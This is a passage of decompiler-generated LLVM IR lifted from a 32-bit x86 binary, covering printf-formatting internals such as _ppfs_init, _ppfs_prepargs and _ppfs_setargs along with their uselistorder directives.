dec_label_pc_804e69c.dec_label_pc_804e6fd.loopexit_crit_edge: ; preds = %dec_label_pc_804e69c
  %v0_804e6fd.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e6fd

dec_label_pc_804e6a9:                             ; preds = %dec_label_pc_804e69c, %dec_label_pc_804e6f7
  %v0_804e6a9 = phi i32 [ %v2_804e6f7, %dec_label_pc_804e6f7 ], [ %v0_804e6f97, %dec_label_pc_804e69c ]
  %tmp102 = icmp ult i32 %v0_804e6a9, 129
  br i1 %tmp102, label %dec_label_pc_804e6b8, label %dec_label_pc_804e6b3

dec_label_pc_804e6b3:                             ; preds = %dec_label_pc_804e6a9
  br label %dec_label_pc_804e6b8

dec_label_pc_804e6b8:                             ; preds = %dec_label_pc_804e6a9, %dec_label_pc_804e6b3
  %storemerge103 = phi i32 [ 128, %dec_label_pc_804e6b3 ], [ %v0_804e6a9, %dec_label_pc_804e6a9 ]
  store i32 %storemerge103, i32* %edx.global-to-local, align 4
  %v0_804e6b8 = load i32, i32* @esp, align 4
  %v1_804e6b8 = add i32 %v0_804e6b8, 332
  %v2_804e6bf = add i32 %v0_804e6b8, -4
  %v3_804e6bf = inttoptr i32 %v2_804e6bf to i32*
  store i32 %v1_804e6b8, i32* %v3_804e6bf, align 4
  %v0_804e6c0 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e6c0 = add i32 %v0_804e6b8, -8
  %v3_804e6c0 = inttoptr i32 %v2_804e6c0 to i32*
  store i32 %v0_804e6c0, i32* %v3_804e6c0, align 4
  %v1_804e6c1 = add i32 %v0_804e6b8, 340
  store i32 %v1_804e6c1, i32* %eax.global-to-local, align 4
  %v2_804e6c8 = add i32 %v0_804e6b8, -12
  %v3_804e6c8 = inttoptr i32 %v2_804e6c8 to i32*
  store i32 %v1_804e6c1, i32* %v3_804e6c8, align 4
  %v1_804e6c9 = add i32 %v0_804e6b8, 204
  store i32 %v1_804e6c9, i32* @edi, align 4
  %v2_804e6d0 = add i32 %v0_804e6b8, -16
  %v3_804e6d0 = inttoptr i32 %v2_804e6d0 to i32*
  store i32 %v1_804e6c9, i32* %v3_804e6d0, align 4
  %v0_804e6d1 = call i32 @__GI_wcsrtombs()
  store i32 %v0_804e6d1, i32* @ebx, align 4
  %v0_804e6d8 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804e6dd = icmp eq i32 %v0_804e6d1, 0
  br i1 %v1_804e6dd, label %dec_label_pc_804e6f3, label %dec_label_pc_804e6e1

dec_label_pc_804e6e1:                             ; preds = %dec_label_pc_804e6b8
  %v0_804e6e1 = load i32, i32* @ebp, align 4
  %v2_804e6e1 = add i32 %v0_804e6d8, 12
  %v3_804e6e1 = inttoptr i32 %v2_804e6e1 to i32*
  store i32 %v0_804e6e1, i32* %v3_804e6e1, align 4
  %v1_804e6e2 = add i32 %v0_804e6d8, 384
  %v2_804e6e2 = inttoptr i32 %v1_804e6e2 to i32*
  %v3_804e6e2 = load i32, i32* %v2_804e6e2, align 4
  %v5_804e6e2 = add i32 %v0_804e6d8, 8
  %v6_804e6e2 = inttoptr i32 %v5_804e6e2 to i32*
  store i32 %v3_804e6e2, i32* %v6_804e6e2, align 4
  %v2_804e6e9 = add i32 %v0_804e6d8, 4
  %v3_804e6e9 = inttoptr i32 %v2_804e6e9 to i32*
  store i32 %v0_804e6d1, i32* %v3_804e6e9, align 4
  %v0_804e6ea = load i32, i32* @edi, align 4
  %v3_804e6ea = inttoptr i32 %v0_804e6d8 to i32*
  store i32 %v0_804e6ea, i32* %v3_804e6ea, align 4
  %v0_804e6eb = load i32, i32* %stack_var_-364, align 4
  %v4_804e6eb = call i32 @__stdio_fwrite(i32 %v0_804e6eb, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804e6eb, i32* %eax.global-to-local, align 4
  %v0_804e6f0 = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e6f3

dec_label_pc_804e6f3:                             ; preds = %dec_label_pc_804e6b8, %dec_label_pc_804e6e1
  %v0_804e72b49.in = phi i32 [ %v0_804e6d8, %dec_label_pc_804e6b8 ], [ %v0_804e6f0, %dec_label_pc_804e6e1 ]
  %v1_804e6f7 = phi i32 [ 0, %dec_label_pc_804e6b8 ], [ %v4_804e6eb, %dec_label_pc_804e6e1 ]
  %v0_804e72b49 = add i32 %v0_804e72b49.in, 16
  %v12_804e6f3 = icmp eq i32 %v1_804e6f7, %v0_804e6d1
  %v1_804e6f5 = icmp eq i1 %v12_804e6f3, false
  br i1 %v1_804e6f5, label %dec_label_pc_804e72b, label %dec_label_pc_804e6f7

dec_label_pc_804e6f7:                             ; preds = %dec_label_pc_804e6f3
  %v0_804e6f7 = load i32, i32* @esi, align 4
  %v2_804e6f7 = sub i32 %v0_804e6f7, %v1_804e6f7
  %v12_804e6f7 = icmp eq i32 %v2_804e6f7, 0
  store i32 %v2_804e6f7, i32* @esi, align 4
  %v1_804e6fb = icmp eq i1 %v12_804e6f7, false
  br i1 %v1_804e6fb, label %dec_label_pc_804e6a9, label %dec_label_pc_804e6fd

dec_label_pc_804e6fd:                             ; preds = %dec_label_pc_804e6f7, %dec_label_pc_804e692.thread, %dec_label_pc_804e69c.dec_label_pc_804e6fd.loopexit_crit_edge, %dec_label_pc_804e692
  %v0_804e6fd = phi i32 [ %v1_804e68f, %dec_label_pc_804e692 ], [ %v0_804e6fd.pre.pre, %dec_label_pc_804e69c.dec_label_pc_804e6fd.loopexit_crit_edge ], [ %v1_804e665, %dec_label_pc_804e692.thread ], [ %v0_804e72b49, %dec_label_pc_804e6f7 ]
  %v1_804e6fd = add i32 %v0_804e6fd, 8
  %v2_804e6fd = inttoptr i32 %v1_804e6fd to i32*
  %v3_804e6fd = load i32, i32* %v2_804e6fd, align 4
  store i32 %v3_804e6fd, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804e706 = add i32 %v0_804e6fd, 368
  %v2_804e706 = inttoptr i32 %v1_804e706 to i32*
  %v3_804e706 = load i32, i32* %v2_804e706, align 4
  store i32 %v3_804e706, i32* @eax, align 4
  %v0_804e70d = call i32 @_charpad()
  store i32 %v0_804e70d, i32* %eax.global-to-local, align 4
  %v1_804e712 = load i32, i32* @esp, align 4
  %v2_804e712 = add i32 %v1_804e712, 8
  %v3_804e712 = inttoptr i32 %v2_804e712 to i32*
  %v4_804e712 = load i32, i32* %v3_804e712, align 4
  %v15_804e712 = icmp eq i32 %v0_804e70d, %v4_804e712
  %v1_804e716 = icmp eq i1 %v15_804e712, false
  br i1 %v1_804e716, label %dec_label_pc_804e72b, label %dec_label_pc_804e718

dec_label_pc_804e718:                             ; preds = %dec_label_pc_804e6fd, %dec_label_pc_804e492, %dec_label_pc_804e2c0
  %v0_804e718 = phi i32 [ %v1_804e712, %dec_label_pc_804e6fd ], [ %v0_804e718.pre, %dec_label_pc_804e492 ], [ %v1_804e2de, %dec_label_pc_804e2c0 ]
  %v1_804e718 = add i32 %v0_804e718, 16
  %v2_804e718 = inttoptr i32 %v1_804e718 to i32*
  %v3_804e718 = load i32, i32* %v2_804e718, align 4
  store i32 %v3_804e718, i32* @ebx, align 4
  store i32 %v3_804e718, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e218.backedge

dec_label_pc_804e723:                             ; preds = %dec_label_pc_804e256
  %v1_804e723 = add i32 %v0_804e723, 2
  store i32 %v1_804e723, i32* @ebx, align 4
  br label %dec_label_pc_804e218.backedge

dec_label_pc_804e72b:                             ; preds = %dec_label_pc_804e242, %dec_label_pc_804e6fd, %dec_label_pc_804e692, %dec_label_pc_804e63d, %dec_label_pc_804e616, %dec_label_pc_804e586, %dec_label_pc_804e501, %dec_label_pc_804e4d5, %dec_label_pc_804e469, %dec_label_pc_804e6f3
  %v0_804e72b = phi i32 [ %v0_804e72b49, %dec_label_pc_804e6f3 ], [ %v0_804e72b.pre.pre, %dec_label_pc_804e242 ], [ %v1_804e712, %dec_label_pc_804e6fd ], [ %v1_804e68f, %dec_label_pc_804e692 ], [ %v1_804e665, %dec_label_pc_804e63d ], [ %v1_804e62b, %dec_label_pc_804e616 ], [ %v0_804e2b8.lcssa, %dec_label_pc_804e586 ], [ %v1_804e519, %dec_label_pc_804e501 ], [ %v1_804e4ec, %dec_label_pc_804e4d5 ], [ %v1_804e487, %dec_label_pc_804e469 ]
  %v1_804e72b = inttoptr i32 %v0_804e72b to i32*
  store i32 -1, i32* %v1_804e72b, align 4
  br label %dec_label_pc_804e732

dec_label_pc_804e732:                             ; preds = %dec_label_pc_804e24d, %dec_label_pc_804e1bb, %dec_label_pc_804e1da, %dec_label_pc_804e72b
  %v0_804e732 = load i32, i32* @esp, align 4
  %v1_804e732 = inttoptr i32 %v0_804e732 to i32*
  %v2_804e732 = load i32, i32* %v1_804e732, align 4
  store i32 %v2_804e732, i32* %eax.global-to-local, align 4
  %v1_804e735 = add i32 %v0_804e732, 348
  %v1_804e73b = inttoptr i32 %v1_804e735 to i32*
  %v2_804e73b = load i32, i32* %v1_804e73b, align 4
  store i32 %v2_804e73b, i32* @ebx, align 4
  ret i32 %v2_804e732

; uselistorder directives
  uselistorder i32 %v1_804e723, { 1, 0 }
  uselistorder i32 %v3_804e718, { 2, 3, 0, 1 }
  uselistorder i32 %v0_804e6fd, { 1, 0 }
  uselistorder i32 %v2_804e6f7, { 1, 2, 0 }
  uselistorder i32 %v0_804e72b49, { 1, 0 }
  uselistorder i32 %v1_804e6f7, { 1, 0 }
  uselistorder i32 %v0_804e6d8, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v0_804e665, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_804e63d, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804e616, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804e5ea, { 1, 0, 2 }
  uselistorder i32 %v6_804e5d7, { 1, 0 }
  uselistorder i32 %v1_804e5d4, { 1, 0 }
  uselistorder i32 %v0_804e5cd, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804e557, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_804e567, { 2, 3, 1, 0 }
  uselistorder i32 %v0_804e4c8, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v0_804e4ae, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v0_804e447, { 1, 0, 2 }
  uselistorder i32 %v1_804e3cb, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v0_804e41e, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_804e3a7, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804e360, { 1, 0 }
  uselistorder i32 %v1_804e36d, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v3_804e2b8, { 3, 10, 11, 5, 4, 7, 6, 8, 12, 0, 1, 2, 13, 9, 14, 15 }
  uselistorder i32 %v0_804e2b8.lcssa, { 0, 8, 7, 6, 9, 24, 23, 12, 13, 14, 15, 16, 17, 11, 10, 19, 18, 22, 21, 20, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_804e2b4, { 1, 0 }
  uselistorder i32 %v1_804e2b4.pre, { 1, 0 }
  uselistorder i32 %v1_804e2b3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v1_804e2b0, { 1, 0 }
  uselistorder i32 %v2_804e2b480, { 1, 0 }
  uselistorder i32 %v3_804e29a, { 1, 0 }
  uselistorder i32 %v1_804e256, { 0, 2, 3, 1 }
  uselistorder i32 %v2_804e222, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804e226, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804e210, { 1, 0, 2 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 3, 2, 4, 7, 0, 6, 5, 1, 8, 9, 10 }
  uselistorder i32* %edx.global-to-local, { 2, 3, 0, 4, 25, 5, 1, 6, 10, 7, 8, 9, 11, 12, 13, 14, 16, 15, 18, 17, 19, 20, 26, 21, 22, 23, 27, 24, 28, 29, 30, 31 }
  uselistorder i32* %ecx.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 10, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 53, 52, 54, 55, 56, 57 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 -28, { 0, 1, 2, 6, 5, 4, 3, 7, 8, 9, 10 }
  uselistorder i32 204, { 2, 0, 3, 1, 4 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_804e732, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804e72b, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_804e6fd, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804e6f3, { 1, 0 }
  uselistorder label %dec_label_pc_804e6b8, { 1, 0 }
  uselistorder label %dec_label_pc_804e6a9, { 1, 0 }
  uselistorder label %dec_label_pc_804e63d, { 1, 0 }
  uselistorder label %dec_label_pc_804e60f, { 1, 0 }
  uselistorder label %dec_label_pc_804e5f4, { 1, 0 }
  uselistorder label %dec_label_pc_804e5de, { 1, 0 }
  uselistorder label %dec_label_pc_804e5ca, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e5be, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804e557, { 1, 0 }
  uselistorder label %dec_label_pc_804e54a, { 1, 0 }
  uselistorder label %dec_label_pc_804e4d5, { 1, 0 }
  uselistorder label %dec_label_pc_804e469, { 1, 0 }
  uselistorder label %dec_label_pc_804e41e, { 1, 0 }
  uselistorder label %dec_label_pc_804e40f, { 6, 2, 1, 3, 5, 0, 4 }
  uselistorder label %dec_label_pc_804e3d5, { 1, 0 }
  uselistorder label %dec_label_pc_804e3bc, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804e36d, { 1, 0 }
  uselistorder label %dec_label_pc_804e354, { 1, 0 }
  uselistorder label %dec_label_pc_804e340, { 1, 0 }
  uselistorder label %dec_label_pc_804e33b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e31c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e2a9, { 1, 0 }
  uselistorder label %dec_label_pc_804e2a1, { 1, 0 }
  uselistorder label %dec_label_pc_804e24d, { 1, 0 }
  uselistorder label %dec_label_pc_804e242, { 1, 0 }
  uselistorder label %dec_label_pc_804e218.backedge, { 2, 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e740 = load i32, i32* @esi, align 4
  %v0_804e741 = load i32, i32* @ebx, align 4
  store i32 %v0_804e741, i32* %stack_var_-8, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg2, i32* @esi, align 4
  %v3_804e755 = bitcast i32* %arg1 to i8*
  %v4_804e755 = call i32 @__GI_memset(i8* %v3_804e755, i32 0, i32 188)
  store i32 %v4_804e755, i32* %eax.global-to-local, align 4
  %v0_804e75a = load i32, i32* @ebx, align 4
  %v1_804e75a = add i32 %v0_804e75a, 24
  %v2_804e75a = inttoptr i32 %v1_804e75a to i32*
  %v3_804e75a = load i32, i32* %v2_804e75a, align 4
  %v4_804e75a = add i32 %v3_804e75a, -1
  store i32 %v4_804e75a, i32* %v2_804e75a, align 4
  %v0_804e75d = load i32, i32* @esi, align 4
  %v1_804e75d = load i32, i32* @ebx, align 4
  %v2_804e75d = inttoptr i32 %v1_804e75d to i32*
  store i32 %v0_804e75d, i32* %v2_804e75d, align 4
  %v0_804e75f = load i32, i32* @ebx, align 4
  %v1_804e75f = add i32 %v0_804e75f, 40
  store i32 %v1_804e75f, i32* %eax.global-to-local, align 4
  store i32 9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e76a

dec_label_pc_804e76a:                             ; preds = %dec_label_pc_804e76a, %entry
  %v0_804e76a = phi i32 [ %v1_804e770, %dec_label_pc_804e76a ], [ %v1_804e75f, %entry ]
  %v1_804e76a = inttoptr i32 %v0_804e76a to i32*
  store i32 8, i32* %v1_804e76a, align 4
  %v0_804e770 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e770 = add i32 %v0_804e770, 4
  store i32 %v1_804e770, i32* %eax.global-to-local, align 4
  %v0_804e773 = load i32, i32* %edx.global-to-local, align 4
  %v1_804e773 = add i32 %v0_804e773, -1
  %v8_804e773 = icmp eq i32 %v1_804e773, 0
  store i32 %v1_804e773, i32* %edx.global-to-local, align 4
  %v1_804e774 = icmp eq i1 %v8_804e773, false
  br i1 %v1_804e774, label %dec_label_pc_804e76a, label %dec_label_pc_804e776

dec_label_pc_804e776:                             ; preds = %dec_label_pc_804e76a
  %v0_804e776 = load i32, i32* @esi, align 4
  store i32 %v0_804e776, i32* %eax.global-to-local, align 4
  %v1_804e7a120 = inttoptr i32 %v0_804e776 to i8*
  %v2_804e7a121 = load i8, i8* %v1_804e7a120, align 1
  %v3_804e7a122 = zext i8 %v2_804e7a121 to i32
  %v5_804e7a123 = and i32 %v1_804e773, -256
  %v6_804e7a124 = or i32 %v3_804e7a122, %v5_804e7a123
  store i32 %v6_804e7a124, i32* %edx.global-to-local, align 4
  %v4_804e7a325 = icmp eq i8 %v2_804e7a121, 0
  %v1_804e7a526 = icmp eq i1 %v4_804e7a325, false
  br i1 %v1_804e7a526, label %dec_label_pc_804e77f, label %dec_label_pc_804e7a7

dec_label_pc_804e77f:                             ; preds = %dec_label_pc_804e776, %dec_label_pc_804e7a1.backedge
  %v6_804e7a129 = phi i32 [ %v6_804e7a1, %dec_label_pc_804e7a1.backedge ], [ %v6_804e7a124, %dec_label_pc_804e776 ]
  %v2_804e7a128 = phi i8 [ %v2_804e7a1, %dec_label_pc_804e7a1.backedge ], [ %v2_804e7a121, %dec_label_pc_804e776 ]
  %v0_804e78427 = phi i32 [ %v0_804e784.be, %dec_label_pc_804e7a1.backedge ], [ %v0_804e776, %dec_label_pc_804e776 ]
  %v10_804e77f = icmp eq i8 %v2_804e7a128, 37
  %v1_804e782 = icmp eq i1 %v10_804e77f, false
  br i1 %v1_804e782, label %dec_label_pc_804e7a0, label %dec_label_pc_804e784

dec_label_pc_804e784:                             ; preds = %dec_label_pc_804e77f
  %v1_804e784 = add i32 %v0_804e78427, 1
  store i32 %v1_804e784, i32* %eax.global-to-local, align 4
  %v1_804e785 = inttoptr i32 %v1_804e784 to i8*
  %v2_804e785 = load i8, i8* %v1_804e785, align 1
  %v11_804e785 = icmp eq i8 %v2_804e785, 37
  br i1 %v11_804e785, label %dec_label_pc_804e7a0, label %dec_label_pc_804e78a

dec_label_pc_804e78a:                             ; preds = %dec_label_pc_804e784
  %v1_804e78d = load i32, i32* @ebx, align 4
  %v2_804e78d = inttoptr i32 %v1_804e78d to i32*
  store i32 %v1_804e784, i32* %v2_804e78d, align 4
  %v0_804e78f = load i32, i32* @ebx, align 4
  %v1_804e790 = inttoptr i32 %v0_804e78f to i32*
  %v2_804e790 = call i32 @_ppfs_parsespec(i32* %v1_804e790)
  store i32 %v2_804e790, i32* %eax.global-to-local, align 4
  %v2_804e798 = icmp slt i32 %v2_804e790, 0
  br i1 %v2_804e798, label %dec_label_pc_804e7ab, label %dec_label_pc_804e79c

dec_label_pc_804e79c:                             ; preds = %dec_label_pc_804e78a
  %v0_804e79c = load i32, i32* @ebx, align 4
  %v1_804e79c = inttoptr i32 %v0_804e79c to i32*
  %v2_804e79c = load i32, i32* %v1_804e79c, align 4
  %v4_804e7a1.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e7a1.backedge

dec_label_pc_804e7a0:                             ; preds = %dec_label_pc_804e784, %dec_label_pc_804e77f
  %v0_804e7a0 = phi i32 [ %v1_804e784, %dec_label_pc_804e784 ], [ %v0_804e78427, %dec_label_pc_804e77f ]
  %v1_804e7a0 = add i32 %v0_804e7a0, 1
  br label %dec_label_pc_804e7a1.backedge

dec_label_pc_804e7a1.backedge:                    ; preds = %dec_label_pc_804e7a0, %dec_label_pc_804e79c
  %v4_804e7a1.be = phi i32 [ %v4_804e7a1.pre.pre, %dec_label_pc_804e79c ], [ %v6_804e7a129, %dec_label_pc_804e7a0 ]
  %v0_804e784.be = phi i32 [ %v2_804e79c, %dec_label_pc_804e79c ], [ %v1_804e7a0, %dec_label_pc_804e7a0 ]
  store i32 %v0_804e784.be, i32* %eax.global-to-local, align 4
  %v1_804e7a1 = inttoptr i32 %v0_804e784.be to i8*
  %v2_804e7a1 = load i8, i8* %v1_804e7a1, align 1
  %v3_804e7a1 = zext i8 %v2_804e7a1 to i32
  %v5_804e7a1 = and i32 %v4_804e7a1.be, -256
  %v6_804e7a1 = or i32 %v3_804e7a1, %v5_804e7a1
  store i32 %v6_804e7a1, i32* %edx.global-to-local, align 4
  %v4_804e7a3 = icmp eq i8 %v2_804e7a1, 0
  %v1_804e7a5 = icmp eq i1 %v4_804e7a3, false
  br i1 %v1_804e7a5, label %dec_label_pc_804e77f, label %dec_label_pc_804e7a1.dec_label_pc_804e7a7_crit_edge

dec_label_pc_804e7a1.dec_label_pc_804e7a7_crit_edge: ; preds = %dec_label_pc_804e7a1.backedge
  %v0_804e7a7.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804e7a7

dec_label_pc_804e7a7:                             ; preds = %dec_label_pc_804e7a1.dec_label_pc_804e7a7_crit_edge, %dec_label_pc_804e776
  %v0_804e7a7 = phi i32 [ %v0_804e7a7.pre, %dec_label_pc_804e7a1.dec_label_pc_804e7a7_crit_edge ], [ %v0_804e776, %dec_label_pc_804e776 ]
  %v1_804e7a7 = load i32, i32* @ebx, align 4
  %v2_804e7a7 = inttoptr i32 %v1_804e7a7 to i32*
  store i32 %v0_804e7a7, i32* %v2_804e7a7, align 4
  br label %dec_label_pc_804e7ab

dec_label_pc_804e7ab:                             ; preds = %dec_label_pc_804e78a, %dec_label_pc_804e7a7
  %storemerge = phi i32 [ 0, %dec_label_pc_804e7a7 ], [ -1, %dec_label_pc_804e78a ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_804e7ab = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e7ab, i32* @edx, align 4
  %v2_804e7ac = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804e7ac, i32* @ebx, align 4
  store i32 %v0_804e740, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_804e7a1, { 1, 0 }
  uselistorder i8 %v2_804e7a1, { 1, 2, 0 }
  uselistorder i32 %v0_804e784.be, { 2, 1, 0 }
  uselistorder i32 %v0_804e78427, { 1, 0 }
  uselistorder i32 %v0_804e776, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804e773, { 0, 2, 1 }
  uselistorder i32 %v1_804e770, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 8, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_804e7ab, { 1, 0 }
  uselistorder label %dec_label_pc_804e77f, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804e7b0 = load i32, i32* @esi, align 4
  %v0_804e7b1 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804e7bd = add i32 %arg1, 24
  %v2_804e7bd = inttoptr i32 %v1_804e7bd to i32*
  %v3_804e7bd = load i32, i32* %v2_804e7bd, align 4
  %v2_804e7c0 = add i32 %arg1, 76
  %v3_804e7c0 = inttoptr i32 %v2_804e7c0 to i32*
  store i32 %arg2, i32* %v3_804e7c0, align 4
  %tmp8 = icmp slt i32 %v3_804e7bd, 1
  br i1 %tmp8, label %dec_label_pc_804e7ee, label %dec_label_pc_804e7c7

dec_label_pc_804e7c7:                             ; preds = %entry
  %v1_804e7ca = load i32, i32* @ebx, align 4
  %v2_804e7ca = add i32 %v1_804e7ca, 28
  %v3_804e7ca = inttoptr i32 %v2_804e7ca to i32*
  store i32 %v3_804e7bd, i32* %v3_804e7ca, align 4
  %v0_804e7cd = load i32, i32* @ebx, align 4
  %v1_804e7cd = add i32 %v0_804e7cd, 24
  %v2_804e7cd = inttoptr i32 %v1_804e7cd to i32*
  store i32 0, i32* %v2_804e7cd, align 4
  %v0_804e7d4 = load i32, i32* @ebx, align 4
  %v1_804e7d4 = add i32 %v0_804e7d4, 4
  %v2_804e7d4 = inttoptr i32 %v1_804e7d4 to i32*
  store i32 0, i32* %v2_804e7d4, align 4
  %v0_804e7db = load i32, i32* @ebx, align 4
  %v1_804e7db = add i32 %v0_804e7db, 8
  %v2_804e7db = inttoptr i32 %v1_804e7db to i32*
  store i32 0, i32* %v2_804e7db, align 4
  %v0_804e7e2 = load i32, i32* @ebx, align 4
  %v1_804e7e3 = call i32 @_ppfs_setargs(i32 %v0_804e7e2)
  %v1_804e7e8 = load i32, i32* @ebx, align 4
  %v2_804e7e8 = add i32 %v1_804e7e8, 24
  %v3_804e7e8 = inttoptr i32 %v2_804e7e8 to i32*
  store i32 %v3_804e7bd, i32* %v3_804e7e8, align 4
  br label %dec_label_pc_804e7ee

dec_label_pc_804e7ee:                             ; preds = %entry, %dec_label_pc_804e7c7
  %v2_804e7ee = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_804e7b1, i32* @ebx, align 4
  store i32 %v0_804e7b0, i32* @esi, align 4
  ret i32 %v2_804e7ee

; uselistorder directives
  uselistorder i32 %v3_804e7bd, { 1, 2, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804e7ee, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804e7f5 = load i32, i32* @ebx, align 4
  store i32 %v0_804e7f5, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_804e7fa = add i32 %arg1, 80
  store i32 %v1_804e7fa, i32* %ebx.global-to-local, align 4
  %v1_804e7fd = add i32 %arg1, 24
  %v2_804e7fd = inttoptr i32 %v1_804e7fd to i32*
  %v3_804e7fd = load i32, i32* %v2_804e7fd, align 4
  %v4_804e7fd = icmp eq i32 %v3_804e7fd, 0
  %v1_804e801 = icmp eq i1 %v4_804e7fd, false
  %v1_804e8b7 = add i32 %arg1, 8
  %v2_804e8b7 = inttoptr i32 %v1_804e8b7 to i32*
  %v3_804e8b7 = load i32, i32* %v2_804e8b7, align 4
  %v8_804e8b7 = icmp eq i32 %v3_804e8b7, -2147483648
  %v1_804e8be = icmp eq i1 %v8_804e8b7, false
  br i1 %v1_804e801, label %dec_label_pc_804e8b7, label %dec_label_pc_804e807

dec_label_pc_804e807:                             ; preds = %entry
  br i1 %v1_804e8be, label %dec_label_pc_804e821, label %dec_label_pc_804e810

dec_label_pc_804e810:                             ; preds = %dec_label_pc_804e807
  %v1_804e810 = add i32 %arg1, 76
  %v2_804e810 = inttoptr i32 %v1_804e810 to i32*
  %v3_804e810 = load i32, i32* %v2_804e810, align 4
  store i32 %v3_804e810, i32* %eax.global-to-local, align 4
  %v1_804e813 = add i32 %v3_804e810, 4
  store i32 %v1_804e813, i32* %edx.global-to-local, align 4
  store i32 %v1_804e813, i32* %v2_804e810, align 4
  %v0_804e819 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e819 = inttoptr i32 %v0_804e819 to i32*
  %v2_804e819 = load i32, i32* %v1_804e819, align 4
  store i32 %v2_804e819, i32* %eax.global-to-local, align 4
  %v1_804e81b = load i32, i32* @ecx, align 4
  %v2_804e81b = add i32 %v1_804e81b, 80
  %v3_804e81b = inttoptr i32 %v2_804e81b to i32*
  store i32 %v2_804e819, i32* %v3_804e81b, align 4
  %v0_804e81e = load i32, i32* %eax.global-to-local, align 4
  %v1_804e81e = load i32, i32* @ecx, align 4
  %v2_804e81e = add i32 %v1_804e81e, 8
  %v3_804e81e = inttoptr i32 %v2_804e81e to i32*
  store i32 %v0_804e81e, i32* %v3_804e81e, align 4
  %v0_804e821.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_804e821

dec_label_pc_804e821:                             ; preds = %dec_label_pc_804e807, %dec_label_pc_804e810
  %v1_804e830 = phi i32 [ %arg1, %dec_label_pc_804e807 ], [ %v0_804e821.pre, %dec_label_pc_804e810 ]
  %v1_804e821 = add i32 %v1_804e830, 4
  %v2_804e821 = inttoptr i32 %v1_804e821 to i32*
  %v3_804e821 = load i32, i32* %v2_804e821, align 4
